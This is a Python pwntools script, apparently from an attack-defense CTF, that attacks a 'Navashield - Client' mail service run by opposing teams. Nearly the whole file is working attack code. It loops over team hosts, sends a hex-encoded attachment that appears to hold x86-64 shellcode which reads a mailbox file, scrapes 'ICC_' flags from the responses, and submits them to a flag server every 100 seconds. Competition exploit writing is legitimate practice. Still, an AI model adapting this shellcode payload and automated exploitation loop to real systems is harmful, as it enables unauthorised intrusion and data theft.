#!/usr/bin/env python3
from pwn import *
import time
import requests
import json

def getFlagIds():
    ids = requests.get("https://web.ad.teameurope.space/competition/teams.json").json()
    flagIds = dict()
    

    chal = ids['flag_ids']["Navashield - Client"]

    # print(json.dumps(chal,indent=4))

    for i in range(1,26):
        flagIds[str(i)] = list()
        if i == 17:
            continue
        try:
            temp = chal[str(i)]
        except:
            continue
        for line in temp:
            flagIds[str(i)].append(line)
    return flagIds

submittedFlags = []
while True:

    flags = []
    flagIds = getFlagIds()
    for i in range(18,26):
        if str(i) in flagIds.keys():
            for id in flagIds[str(i)]:
                if i == 17:
                    continue
                try:
                    r = remote(f"10.20.{str(i)}.6",5000)
                    # r = remote(f"10.20.18.6",5000)
                except:
                    break
                try:
                    
                    r.recvuntil(b"> ")
                except:
                    r.close()
                    continue

                try:
                    r.sendline("1")

                    print(r.recvuntil(b"Sender adress: "))

                    # id = flagIds["18"][0]
                    r.sendline("")
                    
                    print(r.recv())

                    print(r.recvuntil(b"Sender modulus: "))
                    
                    r.sendline("1337")
                    
                    print(r.recvuntil(b"Message: "))
                    r.sendline("")

                    r.recvuntil(b"Attachment 0: ")

                    r.sendline("4558450002000000ffffff7f08000000010200000000000000ffffff7f5c00000000488d9c2400ffffff488d3d2d00000031f66a02580f0589c74889deba00010000b8000000000f0589c2bf020000004889de89c2b8010000000f050f0b6d61696c626f782f52464d694b62504154754579395575692f74687265616400")

                    print(r.recvuntil(b"Attachment 1: "))
                    
                    r.sendline("")
                    
                    try:
                        temp = r.recvuntil(b"[3] Exit").decode()
                    except:
                        r.close()
                        continue

                except:
                    r.close()
                    continue

                print(temp)
                
                if "ICC_" in temp:
                    flag = temp.split("Here is the information you requested: ")[1].split("\n")[0]
                    flags.append(flag)
                
                r.close()

    r = remote("10.20.151.1", 31111)
    print(r.recvuntil(b"One flag per line please!\n\n"))

    for flag in flags:
        if flag in submittedFlags:
            continue

        r.sendline(flag)
        print(r.recvline()) # messages / errors
        submittedFlags.append(flag)

    r.close()

    time.sleep(100)
